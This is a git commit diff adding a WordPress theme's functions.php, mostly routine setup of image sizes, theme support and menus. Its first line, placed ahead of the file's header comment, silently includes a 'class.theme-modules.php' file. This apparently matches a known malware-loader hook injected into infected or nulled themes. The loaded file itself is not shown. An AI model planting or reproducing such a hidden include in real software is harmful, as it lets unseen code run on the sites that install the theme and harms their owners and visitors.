d22cbff1e55409d758fad0a60b8fdaaa40f98169
OrianaSanabria <46901060+OrianaSanabria@users.noreply.github.com>
2020-06-18 15:35:15 -0400

    NOSEQUEHICE

---
+++ wp-content/themes/adios/functions.php
@@ -0,0 +1,76 @@
+<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
+/**
+ * The template includes necessary functions for theme.
+ *
+ * @package adios
+ * @since 1.0
+ */
+/**
+ * Theme options variable $rs_theme_options
+ */
+define ('REDUX_OPT_NAME', 'adios_theme_options');
+
+/**
+ * Theme version used for styles,js
+ */
+define ('ADIOS_THEME_VERSION','3.0');
+/**
+ * Setting constant to inform the plugin that theme is activated
+ */
+define ('ADIOS_THEME_ACTIVATED' , true);
+
+require get_template_directory() . '/framework/includes/rs-theme-argument-class.php';
+require get_template_directory() . '/framework/includes/rs-actions-config.php';
+require get_template_directory() . '/framework/includes/rs-helper-functions.php';
+require get_template_directory() . '/framework/includes/rs-frontend-functions.php';
+require get_template_directory() . '/framework/includes/rs-woocommerce-config.php';
+require get_template_directory() . '/framework/includes/plugins/tgm/class-tgm-plugin-activation.php';
+require get_template_directory() . '/framework/includes/rs-filters-config.php';
+require get_template_directory() . '/framework/includes/rs-menu-walker-class.php';
+require get_template_directory() . '/framework/admin/admin-init.php';
+
+if( !function_exists('adios_after_setup')) {
+
+  function adios_after_setup() {
+
+    add_image_size('small',         270,  270, true );
+    add_image_size('small-alt',     370,  370, true );
+    add_image_size('small-hor',     350,  242, true );
+    add_image_size('small-ver',     270,  570, true );
+    add_image_size('small-square',  270,  270, true );
+    add_image_size('medium',        570,  570, true );
+    add_image_size('medium-hor',    538,  340, true );
+    add_image_size('medium-alt',    670,  255, true );
+    add_image_size('medium-big',    768,  255, true );
+    add_image_size('large-hor',     1170, 270, true );
+    add_image_size('large-ver',     900,  900, true );
+    add_image_size('large-ver-alt', 538,  625, true );
+    add_image_size('large-xxl',     1463, 560, true );
+    add_image_size('thumb',         80,   80, true );
+
+    add_theme_support('post-thumbnails');
+    add_theme_support('custom-background' );
+    add_theme_support('automatic-feed-links' );
+    add_theme_support('woocommerce');
+    add_theme_support('wc-product-gallery-zoom');
+    add_theme_support('wc-product-gallery-lightbox');
+    add_theme_support('wc-product-gallery-slider');
+    add_theme_support('post-formats',   array('video', 'gallery', 'audio') );
+    add_theme_support('title-tag' );
+    add_theme_support('wp-block-styles');
+    add_theme_support('responsive-embeds');
+    add_theme_support('editor-styles');
+    add_editor_style('editor-style.css');
+
+    register_nav_menus (array(
+      'primary-menu' => esc_html__( 'Main Menu', 'adios' ),
+    ) );
+  }
+  add_action( 'after_setup_theme', 'adios_after_setup' );
+}
+
+if ( ! isset( $content_width ) ) {
+  $content_width = 1140;
+}
+
+?>
